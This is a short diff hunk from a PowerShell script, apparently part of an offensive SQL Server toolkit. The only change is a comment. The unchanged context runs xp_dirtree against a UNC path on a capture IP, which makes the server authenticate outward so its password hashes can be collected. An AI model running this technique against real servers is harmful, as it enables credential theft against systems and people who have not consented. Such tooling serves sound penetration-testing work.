@@ -63,7 +63,7 @@ ForEach-Object{
 
     Get-SQLQuery -Instance $CurrentInstance -Query "xp_dirtree '\\$captureip\path'" -Verbose
      
-    # Sleep to give the SQL Server time to connect to us
+    # Sleep to give the SQL Server time to send us hashes :)
     sleep $timeout
  
     # Get hashes
